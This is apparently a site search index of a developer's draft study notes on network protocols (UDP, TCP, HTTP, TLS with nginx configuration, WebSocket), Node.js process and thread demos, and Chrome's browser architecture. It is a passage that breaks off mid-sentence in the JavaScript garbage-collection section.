[{"id":0,"href":"/docs/research/be_protocol/tcp_udp/","title":"TCP - UDP - Draft","section":"Backend Protocol","content":" TCP - UDP # UDP # User Datagram Protocol\nOverview # Message Based Layer 4 protocol Ability to address processes in a host using ports Simple protocol to send and receive messages Prior communication not required (double edge sword) Stateless no knowledge is stored on the host 8 byte header Datagram Demo # // server.js import dgram from \u0026#34;dgram\u0026#34;; const socket = dgram.createSocket(\u0026#34;udp4\u0026#34;); socket.bind(5500, \u0026#34;127.0.0.1\u0026#34;); socket.on(\u0026#34;message\u0026#34;, (msg, info) =\u0026gt; { console.log( `My server got a datagram ${msg}, from ${info.address}:${info.port}` ); }); # client terminal nc -u 127.0.0.1 5500 # client terminal Hi # client terminal I am Dang The result of the server log: (TBU)\nTCP # Transmission Control Protocol\nOverview # Stream based Layer 4 protocol Ability to address processes in a host using ports “Controls” the transmission unlike UDP which is a firehose Connection Requires handshake 20 bytes headers Segment (can go to 60) Stateful 3 ways handshake # Demo # // server.js import net from \u0026#34;net\u0026#34;; const server = net.createServer((socket) =\u0026gt; { console.log( `TCP successfully handshack with ${socket.remoteAddress}:${socket.remotePort}` ); socket.write(\u0026#34;Hello Client!\u0026#34;); socket.on(\u0026#34;data\u0026#34;, (data) =\u0026gt; { console.log(`Received data ${data.toString()}`); }); server.listen(6600, \u0026#34;127.0.0.1\u0026#34;); }); # client terminal nc 127.0.0.1 6600 Client recieve message when successful establish the connection: (TBU)\n# client terminal This is data to send to the server! Reference # Geeksforgeeks: Differences between TCP and UDP (06 May, 2023) Udemy: Fundamentals of Backend Engineering (Feb, 2024) "},{"id":1,"href":"/docs/research/be_protocol/http/","title":"HTTP - Draft","section":"Backend Protocol","content":" HTTP # HTTP 1.0 # Every request to the same server requires a separate TCP connection\nHTTP 1.1 # Was published in 1997\nA TCP connection can be left open for reuse (persistent connection)\nHTTP pipelining # HTTP pipelining is a feature of HTTP/1.1, which allows multiple HTTP requests to be sent over a single TCP connection without waiting for the corresponding responses. HTTP/1.1 requires servers to respond to pipelined requests correctly\nHOL (head-of-line) blocking issue # When the number of allowed parallel requests in the browser is used up, subsequent requests need to wait for the former ones to complete\nHTTP 2.0 # Was published in 2015\nIt addresses HOL issue through request multiplexing, which eliminates HOL blocking at the application layer, but HOL still exists at the transport (TCP) layer. As you can see in the diagram, HTTP 2.0 introduced the concept of HTTP “streams”: an abstraction that allows multiplexing different HTTP exchanges onto the same TCP connection. Each stream doesn’t need to be sent in order\nHTTP 3.0 # HTTP over QUIC\nWas published in 2020 It is the proposed successor to HTTP 2.0. It uses QUIC instead of TCP for the underlying transport protocol, thus removing HOL blocking in the transport layer QUIC is based on UDP. It introduces streams as first-class citizens at the transport layer. QUIC streams share the same QUIC connection, so no additional handshakes and slow starts are required to create new ones, but QUIC streams are delivered independently such that in most cases packet loss affecting one stream doesn\u0026rsquo;t affect others Reference # Upwork: What is the HTTP/2 Protocol? Overview and Examples (Aug 23, 2021) Alex Xu: System design interview 0 (2022) Mozilla: Connection management in HTTP/1.x (May 10, 2023) "},{"id":2,"href":"/docs/research/be_protocol/tls_ssl/","title":"TLS - SSL - Draft","section":"Backend Protocol","content":" TLS - SSL # Problem # Demo listen plain packet from wifi if user browse a website using http with and without ssl/tls: Link Overview # A protocol for encrypting, securing, and authenticating communications that take place on the Internet SSL was replaced by an updated protocol called TLS some time ago, SSL is still a commonly used term for this technology To see which TLS version of a website (For Chrome): Open the Developer Tools (Ctrl+Shift+I) Select the Security tab Navigate to the Origin you want to inspect At the Connection section, check the results which TLS protocol is used TLS 1.2 # Setup # Nginx Open Your Nginx Configuration sudo vi /etc/nginx/sites-enabled/default Update the ssl_protocols directive and configure cipher suites: ssl_protocols TLSv1.2; ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256'; When you set up a free SSL certificate with Certbot (Let\u0026rsquo;s Encrypt certificate), Certbot automatically sets up ssl_protocols and ssl_ciphers for you (include /etc/letsencrypt/options-ssl-nginx.conf;). I commented this out to allow my demo to work correctly server { listen [::]:443 ssl ipv6only=on; # managed by Certbot listen 443 ssl; # managed by Certbot ssl_certificate /etc/letsencrypt/live/mnptt.io.vn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/mnptt.io.vn/privkey.pem; # managed by Certbot #include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot # Downgrade to TLS 1.2 ssl_protocols TLSv1.2; ssl_ciphers \u0026#39;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256\u0026#39;; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name mnptt.io.vn; location / { try_files $uri $uri/ =404; } } Test the configuration sudo nginx -t Reload Nginx sudo systemctl reload nginx Verify TLS 1.3 # Diffie-Hellman # TLS 1.3 # Setup # Nginx Requirements\nOpenSSL: 1.1.1 or newer Nginx: 1.13.0 or newer Open Your Nginx Configuration\nsudo vi /etc/nginx/sites-enabled/default Update the ssl_protocols directive and configure cipher suites: ssl_protocols TLSv1.3 TLSv1.2; ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384'; When you set up a free SSL certificate with Certbot (Let\u0026rsquo;s Encrypt certificate), Certbot automatically sets up ssl_protocols and ssl_ciphers for you (include /etc/letsencrypt/options-ssl-nginx.conf;). I commented this out to allow my demo to work correctly server { listen [::]:443 ssl ipv6only=on; # managed by Certbot listen 443 ssl; # managed by Certbot ssl_certificate /etc/letsencrypt/live/mnptt.io.vn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/mnptt.io.vn/privkey.pem; # managed by Certbot #include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot # Override settings for TLS 1.3 ssl_protocols TLSv1.2 TLSv1.3; # Enable TLS 1.3 and keep TLS 1.2 ssl_ciphers \u0026#39;TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384\u0026#39;; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name mnptt.io.vn; location / { try_files $uri $uri/ =404; } } Test the configuration sudo nginx -t Reload Nginx sudo systemctl reload nginx Verify SSL Certificate # A SSL certificate contains: Domain name it\u0026rsquo;s issued for Certificate Authority (CA) Validity Period Website\u0026rsquo;s public key Other information No certificate # Invalid certificate # Valid certificate # Validation levels # In terms of encryption strength, all three levels provide the same security Domain Validation # Least-stringent level User only has to prove they control the domain Process can be automated Organization Validation # Manual vetting process Extended Validation # Full background check of the organization At higher levels, they give more verified information about the website owner\u0026rsquo;s identity Types # Single Domain SSL Certificates # One domain and all pages\nWildcard SSL Certificates # One domain and all subdomains\nMulti-Domain SSL Certificates # It\u0026rsquo;s a shared certificate Multiple distinct domains will be listed on a certificate Why we need SSL Certificate? # Prevent: On-path attack Domain spoofing Other methods attackers use to impersonate a website and trick users Establish HTTPS How to setup SSL Certificate? # Free SSL Certificate SSL Certificate for localhost Reference # Cloudflare: How does SSL work? Cloudflare: Types of SSL certificates: SSL certificate types explained Gigamon: What Is TLS 1.2, and Why Should You (Still) Care? Wikipedia: Transport Layer Security (Mar 1st, 2024) Youtube: Let\u0026rsquo;s Encrypt Explained: Free SSL (Oct 25th, 2020) Youtube: Are Free SSL Certificates Really Good Enough for Your Website? (Sep 1st, 2022) Mozilla: SSL Configuration Generator (Nov 13th, 2024) Networkoptix: How to check and/or change the TLS version (Nov 11th, 2024) "},{"id":3,"href":"/docs/research/be_protocol/https/","title":"HTTPS - Draft","section":"Backend Protocol","content":" HTTPS # Over TCP With TLS 1.2 # Over TCP With TLS 1.3 # Over QUIC (HTTP/3) # Over TCP With TLS 1.3 0RTT # Over QUIC 0RTT # "},{"id":4,"href":"/docs/research/be_protocol/webrtc/","title":"WebRTC - Draft","section":"Backend Protocol","content":" WebRTC # Web Real-Time Communication\nOverview # A protocol that connects peer to peer Find a peer to peer path to exchange video and audio in an efficient and low latency manner Standardized API Enables rich communications browsers, mobile, IOT devices "},{"id":5,"href":"/docs/research/be_protocol/websocket/","title":"Websocket - Draft","section":"Backend Protocol","content":" Websocket # Bidirectional communications on the web\nExample code: # // server.js const http = require(\u0026#34;http\u0026#34;); const WebSocketServer = require(\u0026#34;websocket\u0026#34;).server; let connections = []; //create a raw http server (this will help us create the TCP which will then pass to the websocket to do the job) const httpserver = http.createServer(); //pass the httpserver object to the WebSocketServer library to do all the job, this class will override the req/res const websocket = new WebSocketServer({ httpServer: httpserver }); //listen on the TCP socket httpserver.listen(8080, () =\u0026gt; console.log(\u0026#34;My server is listening on port 8080\u0026#34;) ); //when a legit websocket request comes listen to it and get the connection .. once you get a connection that\u0026#39;s it! websocket.on(\u0026#34;request\u0026#34;, (request) =\u0026gt; { const connection = request.accept(null, request.origin); connection.on(\u0026#34;message\u0026#34;, (message) =\u0026gt; { //someone just sent a message tell everybody connections.forEach((c) =\u0026gt; c.send(`User${connection.socket.remotePort} says: ${message.utf8Data}`) ); }); connections.push(connection); //someone just connected, tell everybody connections.forEach((c) =\u0026gt; c.send(`User${connection.socket.remotePort} just connected.`) ); }); // client.js let ws = new WebSocket(\u0026#34;ws://localhost:8080\u0026#34;); ws.onmessage = (message) =\u0026gt; console.log(`Received: ${message.data}`); ws.send(\u0026#34;Hello! I\u0026#39;m client\u0026#34;); "},{"id":6,"href":"/docs/research/be_protocol/grpc/","title":"gRPC - Draft","section":"Backend Protocol","content":" gRPC # Taking HTTP/2 to the next level\nOverview # Client Library: One library for popular languages Protocol: HTTP/2 (hidden implementation) Message Format: Protocol buffers as format "},{"id":7,"href":"/docs/research/be_protocol/communication/","title":"Communication - Draft","section":"Backend Protocol","content":" Communication # Request-Response # Overview # The Request-Response pattern is a fundamental communication pattern where a client sends a request to a server, and the server processes the request and sends back a response. It\u0026rsquo;s one of the most common patterns for communication in distributed systems, client-server architectures, and web applications.\nPush # Real time notification\nOverview # Used by RabbitMQ Implementation # Concept: # Client connects to a server Server sends data to the client Client doesn’t have to request anything Protocol must be bidirectional Example code: # Short Polling # Request is taking a while, I’ll check with you later\nImplementation # Concept: # Client sends a request Server responds immediately with a handle Server continues to process the request Client uses that handle to check for status Multiple “short” request response as polls Long Polling # Implementation # Concept: # Client sends a request Server responds immediately with a handle Server continues to process the request Client uses that handle to check for status Server DOES not reply until it has the response So we got a handle, we can disconnect and we are less chatty Some variation has timeouts too Server sent events # Implementation # Concept: # A response has start and end Client sends a request Server sends logical events as part of response Server never writes the end of the response It is still a request but an unending response Client parses the streams data looking for events Works with request/response (HTTP) Message Queue # Asynchronous messaging for batching jobs and decoupling applications\nOverview # A message queue is a form of asynchronous service-to-service communication used in serverless and microservices architectures. Messages are stored on the queue until they are processed and deleted. Each message is processed only once, by a single consumer. Message queues can be used to decouple heavyweight processing, to buffer or batch work, and to smooth spiky workloads.\nPublish Subcribe # One publisher many readers\nImplementation # Concept: # Reference # Linkedin: Backend Communication Design Patterns (Sep 13, 2023) Freecodecamp: Communication Design Patterns for Backend Development Amazon: Message Queues Udemy: Fundamentals of Backend Engineering (Feb, 2024) "},{"id":8,"href":"/docs/research/process_vs_thread/","title":"Process vs Thread","section":"RESEARCH","content":" Process vs Thread # Program # A Program is an executable file containing a set of instructions and passively stored on disk\nProcess # A Process means a program is in execution. When a program is loaded into the memory and becomes active, the program becomes a process or processes\nThread # A Thread is the smallest unit of execution within a process\nProcess vs Thread # Process # The process requires some essential resources such as registers, program counter, and stack\nEach process has its own memory address space. One process can not corrupt the memory address space of another process. This means that when one process malfunctions, other processes keep running\nThread # A process has at least one thread. It’s called the main thread. It’s not uncommon for a process to have many threads\nEach thread has its own stack. Earlier we mentioned registers, program counters and stack pointers as being part of a process. It’s more accurate to say that those things belong to a thread\nThreads within a process share a memory address space It’s possible to communicate between threads using that shared memory space However, one misbehaving thread could bring down the entire process\nCode demo # When one process malfunctions, other processes keep running Nodejs\nconst cluster = require(\u0026#34;cluster\u0026#34;); if (cluster.isMaster) { // Master process logic console.log(\u0026#34;Master process\u0026#34;, process.pid, \u0026#34;is running\u0026#34;); const normalSlave = cluster.fork(); const misbehavingSlave = cluster.fork(); misbehavingSlave.send({ isNormal: false }); normalSlave.send({ isNormal: true }); setInterval(() =\u0026gt; { console.log(\u0026#34;Master process\u0026#34;, process.pid, \u0026#34;is doing some work.\u0026#34;); }, 300); } else { // Slave process logic console.log(\u0026#34;Slave process\u0026#34;, process.pid, \u0026#34;is running\u0026#34;); process.on(\u0026#34;message\u0026#34;, ({ isNormal }) =\u0026gt; { if (isNormal) { setInterval(() =\u0026gt; { console.log(\u0026#34;Slave process\u0026#34;, process.pid, \u0026#34;is doing some work.\u0026#34;); }, 300); } else { setTimeout(() =\u0026gt; { throw new Error(\u0026#34;Slave process \u0026#34; + process.pid + \u0026#34; is corrupted!!!\u0026#34;); }, 2000); } }); } One misbehaving thread could bring down the entire process Nodejs\nconst { Worker } = require(\u0026#34;worker_threads\u0026#34;); console.log(\u0026#34;Process\u0026#34;, process.pid, \u0026#34;starts\u0026#34;); // Create a misbehaving worker thread const misbehavingWorker = new Worker( ` const { threadId } = require(\u0026#39;worker_threads\u0026#39;); console.log(\u0026#39;Thread\u0026#39;, threadId, \u0026#39;from process\u0026#39;, process.pid, \u0026#39;starts\u0026#39;); // Intentionally cause an unhandled exception setTimeout(() =\u0026gt; { throw new Error(\u0026#39;Thread \u0026#39; + threadId + \u0026#39; is corrupted!!!\u0026#39;); }, 2000); `, { eval: true } ); // Create a normal worker thread const normalWorker = new Worker( ` const { threadId } = require(\u0026#39;worker_threads\u0026#39;); console.log(\u0026#39;Thread\u0026#39;, threadId, \u0026#39;from process\u0026#39;, process.pid, \u0026#39;starts\u0026#39;); // Simulate normal work setInterval(() =\u0026gt; { console.log(\u0026#39;Thread\u0026#39;, threadId, \u0026#39;is doing some work.\u0026#39;); }, 300); `, { eval: true } ); Multithreading and Multiprocessing # Concurrency and Parallelism # Concurrency allows multiple tasks to make progress by interleaving their execution, even if they are not executing simultaneously. It is focused on efficient task scheduling and resource utilization\nParallelism involves executing multiple tasks simultaneously, typically on separate processing units or cores. It aims to achieve higher performance and faster task completion\nMultithreading # Multithreading focuses on generating computing threads from a single process, whereas multiprocessing increases computing power by adding processors\nMultiprocessing # Multiprocessing uses two or more processors to increase computing power, whereas multithreading uses a single process with multiple code segments to increase computing power\nCode demo # Prepared files Nodejs\nk.js\nconst CPUS = require(\u0026#34;os\u0026#34;).cpus(); const NUM_CPU = CPUS.length; const TOTAL_OBJS = 10000000; const numWorkers = NUM_CPU; const workload = TOTAL_OBJS / numWorkers; module.exports = { CPUS, NUM_CPU, TOTAL_OBJS, numWorkers, workload, }; _.js\nconst generateRandomName = () =\u0026gt; { const names = [ \u0026#34;Alice\u0026#34;, \u0026#34;Bob\u0026#34;, \u0026#34;Charlie\u0026#34;, \u0026#34;David\u0026#34;, \u0026#34;Eve\u0026#34;, \u0026#34;Frank\u0026#34;, \u0026#34;Grace\u0026#34;, \u0026#34;Henry\u0026#34;, \u0026#34;Ivy\u0026#34;, \u0026#34;Jack\u0026#34;, ]; return names[Math.floor(Math.random() * names.length)]; }; const generateRandomAge = () =\u0026gt; { return Math.floor(Math.random() * 100) + 1; }; const generateObjects = (count) =\u0026gt; { const objects = []; for (let i = 0; i \u0026lt; count; i++) { const object = { name: generateRandomName(), age: generateRandomAge(), createTime: new Date(), }; objects.push(object); } return objects; }; class Logger { constructor(isEnable) { this.isEnable = !!isEnable; } isDebug = false; logP1(...args) { if (this.isEnable) { console.log(...args); } } debug(...args) { if (this.isDebug \u0026amp;\u0026amp; this.isEnable) { console.log(...args); } } } const ts = () =\u0026gt; new Date().getTime(); class Monitor { startTime; endTime; start() { this.startTime = ts(); } end() { this.endTime = ts(); } getTotal() { return this.endTime - this.startTime; } } module.exports = { Logger, Monitor, generateObjects, }; worker.js\nconst { generateObjects, Monitor, Logger } = require(\u0026#34;../_\u0026#34;); const { workerData, parentPort, threadId } = require(\u0026#34;worker_threads\u0026#34;); const monitor = new Monitor(); const logger = new Logger(true); const { workload, isDebug } = workerData; logger.isDebug = isDebug; logger.debug(\u0026#34;Worker\u0026#34;, threadId, \u0026#34;of process\u0026#34;, process.pid, \u0026#34;is running\u0026#34;); monitor.start(); const objects = generateObjects(workload); monitor.end(); logger.debug( \u0026#34;Worker\u0026#34;, threadId, \u0026#34;generated\u0026#34;, objects.length, \u0026#34;in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34; ); monitor.start(); parentPort.postMessage(objects); monitor.end(); logger.debug(\u0026#34;worker\u0026#34;, threadId, \u0026#34;send data in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34;); Single thread vs multithreading vs multiprocessing Nodejs\nsingleThread.js\nconst { TOTAL_OBJS } = require(\u0026#34;../k\u0026#34;); const { generateObjects, Monitor } = require(\u0026#34;../_\u0026#34;); const monitor = new Monitor(); monitor.start(); const obj = generateObjects(TOTAL_OBJS); monitor.end(); console.log(\u0026#34;Generate\u0026#34;, obj.length, \u0026#34;in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34;); multithread.js\nconst { Worker } = require(\u0026#34;worker_threads\u0026#34;); const { numWorkers, workload, TOTAL_OBJS } = require(\u0026#34;../k\u0026#34;); const { Monitor, Logger } = require(\u0026#34;../_\u0026#34;); let generatedObjects = []; const monitor = new Monitor(); const logger = new Logger(true); // set true to see more logs logger.isDebug = true; function runWorker(workerData) { return new Promise((resolve, reject) =\u0026gt; { const worker = new Worker(\u0026#34;./worker_threads/worker.js\u0026#34;, { workerData }); logger.debug(\u0026#34;Worker\u0026#34;, worker.threadId, \u0026#34;is running\u0026#34;); worker.on(\u0026#34;message\u0026#34;, (message) =\u0026gt; { generatedObjects = generatedObjects.concat(message); }); worker.on(\u0026#34;error\u0026#34;, reject); worker.on(\u0026#34;exit\u0026#34;, (code) =\u0026gt; { if (code === 0) { resolve(); } else { reject(new Error(`Worker stopped with exit code ${code}`)); } }); }); } async function generateObjectsWithWorkers() { const workers = []; monitor.start(); for (let i = 0; i \u0026lt; numWorkers; i++) { const workerData = { workload, isDebug: logger.isDebug, }; workers.push(runWorker(workerData)); } await Promise.all(workers); monitor.end(); logger.logP1( \u0026#34;All done!\u0026#34;, numWorkers, \u0026#34;workers,\u0026#34;, generatedObjects.length, \u0026#34;objects, in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34; ); } generateObjectsWithWorkers(); multiprocess.js\nconst cluster = require(\u0026#34;cluster\u0026#34;); const { workload, numWorkers } = require(\u0026#34;../k\u0026#34;); const { Monitor, Logger, generateObjects } = require(\u0026#34;../_\u0026#34;); const logger = new Logger(true); const monitor = new Monitor(); // set true to see more logs logger.isDebug = true; if (cluster.isMaster) { monitor.start(); logger.logP1(\u0026#34;Master\u0026#34;, process.pid, \u0026#34;is running\u0026#34;); // Fork slaves for (let i = 0; i \u0026lt; numWorkers; i++) { cluster.fork(); } // Collect data from slaves let generatedObjects = []; cluster.on(\u0026#34;message\u0026#34;, (slave, message) =\u0026gt; { generatedObjects = generatedObjects.concat(message); }); // Wait for all workers to finish logic let slaveOff = 0; cluster.on(\u0026#34;disconnect\u0026#34;, () =\u0026gt; { slaveOff++; if (slaveOff === numWorkers) { monitor.end(); logger.logP1( \u0026#34;All done!\u0026#34;, slaveOff, \u0026#34;slaves, in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34; ); // Exit the application process.exit(0); } }); } else { // Slave process logic logger.debug(\u0026#34;Slave\u0026#34;, process.pid, \u0026#34;is running\u0026#34;); let generatedObjects = []; // Generate objects in the worker process monitor.start(); const objects = generateObjects(workload); monitor.end(); generatedObjects = generatedObjects.concat(objects); logger.debug( \u0026#34;Generated\u0026#34;, objects.length, \u0026#34;objects in slave\u0026#34;, process.pid, \u0026#34;in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34; ); // Send objects to the master process monitor.start(); process.send(objects); monitor.end(); logger.debug(\u0026#34;slave\u0026#34;, process.pid, \u0026#34;send data in\u0026#34;, monitor.getTotal(), \u0026#34;ms\u0026#34;); // Disconnect the slave process cluster.worker.disconnect(); } Time-consuming when not communication together Time-consuming when running multiple threads and multiple processes without communication together meaning each item runs separately and does not share data\nNodejs\n// TODO: update guideline how it work and how it look (htop) Time-consuming when communication together Time-consuming when running multiple threads and multiple processes within communication together meaning each item runs separately but shares data with the main item\nNodejs\nContext switching # How does the OS run threads or processes on a CPU (processor) ? =\u0026gt; This is handled by context switching During a context switch, one process is switched out of the CPU (processor) so another process can run\nThe OS stores the states of the current running process so the process can be restored and resume execution at a later point\nIt then restores the previously saved states of a different process and resumes execution for that process\nContext switching is expensive. It involves saving and loading registers, switching out memory pages, and updating various kernel data structures\nSwitching execution between threads also requires context switching\nIt’s generally faster to switch context between threads than between processes\nThere are fewer states to track, and more importantly, since threads share the same memory address space, there is no need to switch out virtual memory pages which is one of the most expensive operations during a context switch\nContext switching is so costly, there are other mechanisms to try to minimize it. Some examples are fibers and coroutines\nThese mechanisms trade complexity for even lower context-switching costs\nIn general, they are cooperatively scheduled, that is, they must yield control for others to run\nIn other words, the application itself handles task scheduling\nIt’s the responsibility of the application to make sure a long-running task is broken up by yielding periodically\nConclusion # Program, process, and thread:\nThe program contains a set of instructions The program is loaded into memory. It becomes one or more running processes. When a process starts, it is assigned memory and resources The thread is the smallest unit of execution within a process. A process can have one or more threads If we can ideally run each thread on each idle core, we can actually run parallelism all jobs we want with the shortest time consuming\nThe cost when sharing data between threads and processes is also expensive, processes are more expensive than threads because threads inside the process use together shared memory address space\nContext-switching will appear when the scheduler of OS assigns one logical processor more than one thread or process that needs to run. Context-switching is expensive\nAppendix # Processor definition # There are 2 definitions of the term Processor that can lead you to confusion when researching\nLet’s devine it into 2 names:\nPhysical processor: means processor definition in the hardware world Logical processor: means processor definition in the software world Physical processor # A processor in this context means the entire CPU chip as the Intel define\nThis image is the complexity of a modern multi-processor, multi-core system Logical processor # A processor in this context means a virtual core:\nCPU has 8 cores CPU has hyperthreading and it is enabled so each core split into 2 virtual cores Virtual memory # A computer can address more memory than the amount physically installed on the system. This extra memory is actually called virtual memory and it is a section of a hard disk that\u0026rsquo;s set up to emulate the computer\u0026rsquo;s RAM\nHyper-threading # Intel® Hyper-Threading Technology is a hardware innovation that allows more than one thread to run on each core. More threads means more work can be done in parallel\nHow does Hyper-Threading work? When Intel® Hyper-Threading Technology is active, the CPU exposes two execution contexts per physical core. This means that one physical core now works like two “logical cores” that can handle different software threads\nReference # Bytebytego: Interview question: Design Twitter (Episode 5) Bytebytego: FANG Interview Question | Process vs Thread Intel: A Better Way to Measure CPU Utilization Medium: Achieving concurrency in Go Stackoverflow: What are the differences between multi-CPU, multi-core and hyper-thread? Tutorialspoint: Operating System - Virtual Memory Wikipedia: Virtual memory Intel: What Is Hyper-Threading? Geeksforgeeks: Difference between User Level thread and Kernel Level thread Geeksforgeeks: Difference between MultiCore and MultiProcessor System Indeed: Multithreading vs. Multiprocessing: What\u0026rsquo;s the Difference? Scaler: Difference Between Multicore and Multiprocessor System Superuser: What\u0026rsquo;s the difference between a multiprocessor and a multiprocessing system? Superuser: What\u0026rsquo;s the difference between multicore proccesor and multiproccess system? Give a thank to ChatGPT dude to support me during a process create multiple supreme demos "},{"id":9,"href":"/docs/research/chrome_architecture/","title":"Chrome Architecture","section":"RESEARCH","content":" Chrome Architecture # Prerequisites # Read process vs thread first if you don\u0026rsquo;t have any process and thread concept in your mind\nBrowser Architecture # When you start an application, a process is created. The program might create thread(s) to help it do work, but that\u0026rsquo;s optional. The Operating System gives the process a \u0026ldquo;slab\u0026rdquo; of memory to work with and all application state is kept in that private memory space. When you close the application, the process also goes away and the Operating System frees up the memory\nA process can ask the Operating System to spin up another process to run different tasks. When this happens, different parts of the memory are allocated for the new process. If two processes need to talk, they can do so by using Inter Process Communication (IPC). Many applications are designed to work this way so that if a worker process get unresponsive, it can be restarted without stopping other processes which are running different parts of the application.\nThere is no standard specification on how one might build a web browser. One browser’s approach may be completely different from another\nChrome uses a separate content process and engine for each website instance, but Firefox reuses processes and engines to limit memory usage\nProcess What it controls? Browser Controls \u0026ldquo;chrome\u0026rdquo; part of the application including address bar, bookmarks, back and forward buttons. Also handles the invisible, privileged parts of a web browser such as network requests and file access Renderer Controls anything inside of the tab where a website is displayed Plugin Controls any plugins used by the website, for example, flash GPU Handles GPU tasks in isolation from other processes. It is separated into different process because GPUs handles requests from multiple apps and draw them in the same surface There are even more processes like the Extension process and utility processes. If you want to see how many processes are running in your Chrome, click the options menu icon more_vert at the top right corner, select More Tools, then select Task Manager. This opens up a window with a list of processes that are currently running and how much CPU/Memory they are using.\nFor the renderer process, multiple processes are created and assigned to each tab. Until very recently, Chrome gave each tab a process when it could; now it tries to give each site its own process, including iframes\nBrowser process # Thread Mission UI Draws buttons and input fields of the browser Network Deals with network stack to receive data from the internet Storage Controls access to the files and more Renderer process # The renderer process is responsible for everything that happens inside of a tab\nThread Mission Main The main thread handles most of the code you send to the user Worker Sometimes parts of your JavaScript is handled by worker threads if you use a web worker or a service worker Compositor and Raster Compositor and raster threads are also run inside of a renderer processes to render a page efficiently and smoothly The renderer process\u0026rsquo;s core job is to turn HTML, CSS, and JavaScript into a web page that the user can interact with\nMain thread # Pharse Job Visual Parsing When the renderer process starts to receive HTML data, the main thread begins to parse the text string (HTML) and turn it into a Document Object Model (DOM) Style calculation The main thread parses CSS and determines the computed style for each DOM node. This is information about what kind of style is applied to each element based on CSS selectors Layout The layout is a process to find the geometry of elements. The main thread walks through the DOM and computed styles and creates the layout tree which has information like x y coordinates and bounding box sizes. Layout tree may be similar structure to the DOM tree, but it only contains information related to what\u0026rsquo;s visible on the page Paint The main thread walks the layout tree to create paint records. Paint record is a note of painting process like \u0026ldquo;background first, then text, then rectangle\u0026rdquo; A website usually uses external resources like images, CSS, and JavaScript. Those files need to be loaded from network or cache. The main thread could request them one by one as they find them while parsing to build a DOM, but in order to speed up, \u0026ldquo;preload scanner\u0026rdquo; is run concurrently.\nWhen the HTML parser finds a \u0026lt;script\u0026gt; tag, it pauses the parsing of the HTML document and has to load, parse, and execute the JavaScript code\nWhy? Because JavaScript can change the shape of the document using things like document.write() which changes the entire DOM structure\nThe browser then loads and runs the JavaScript code asynchronously and does not block the parsing. You may also use JavaScript module if that\u0026rsquo;s suitable. \u0026lt;link rel=\u0026quot;preload\u0026quot;\u0026gt; is a way to inform browser that the resource is definitely needed for current navigation and you would like to download as soon as possible. You can read more on this at Resource Prioritization\nJavaScript # JavaScript, as you may already know, is single threaded, hence you can’t spawn new threads as you like to spread your computation cost over multiple CPU’s core for true-parallel work\nWhen your code is executed it may call the Browser’s APIs to interact with the DOM or schedule some async task. Those async tasks are added to the Event queue or to the prioritized Job queue (if using Promises). As soon as the the Call Stack has finished to process the current tick (is empty), the Event Loop feeds it with a new Tick (which is composed by ONE callback, the FULL job queue, and the POSSIBILITY to call, fully or only some parts, the Render queue)\nCall Stack: it is the place where your code is executed (your functions are loaded and executed, V8 engine in Chrome and NodeJS), it is basically a LIFO stack (last-in-first-out), when it is empty, a.k.a. has completed all the current Tick tasks, it becomes ready to accept the next Tick from the Event Loop Browser APIs: a link between your code and the browser’s internals to schedule tasks, interact with the DOM and more (ex. setTimeout, AJAX, createElement, querySelector, append, click, etc.). In case of callbacks they will add your callback code to the Event queue, instead, in case of a then (promise’s method), your then-code will be added to the Job Queue Event queue: every time you add a callback (ex. via the setTimeout or the AJAX APIs), it is added to this queue Job queue: this queue is reserved for promise’s thens, it is a prioritized queue, its meaning is like ‘execute this code later (= asynchronously), but as soon as possible! (= before the next Event Loop tick)’, and this is why browsers had introduced this new queue to fulfil the Promises specifications Render queue: this is explained in another article Next Tick: it is what will be executed next, basically it’s composed by ONE callback from the Event queue, THE FULL Job queue (this point is important, the current tick will finish only after the Job queue is empty, so you may inadvertently block it from going to the next Tick if you continuously add new jobs to this queue), may re-render (execute the necessary steps in the Render queue to update the screen) Event Loop: it monitors the Call Stack, as soon as it is empty (has finished to process the current tick), the Event Loop feeds it with the next Tick Along the main thread there are many other threads spawned by the browser to do useful stuff:\nParser Thread: parses your code in machine-understandable trees Statistics collector Thread: collects data and statistics to discover insights about your code (the scope is to optimize it runtime) Optimizer Thread: uses the statistics and insights collected by the Statistics collector Thread to make performance optimizations over your code (Caching, Inlining, etc.) Garbage Collector Thread: removes unconnected (no more referenceable from the ROOT node) JavaScript objects to free up memory using a mark-and-sweep algorithm. We don’t know when this will happen and have no control over it. AFAIK the browser uses this thread to track whose objects to remove and do useful stuff, but when it needs to remove them it actually blocks the main thread and uses it. From the Firefox blog Q:”Silly question here, why must garbage collection stop UI events and js execution? Couldn’t the GC just run in a separate thread?”, R:”It can be done, but the garbage collector is looking at 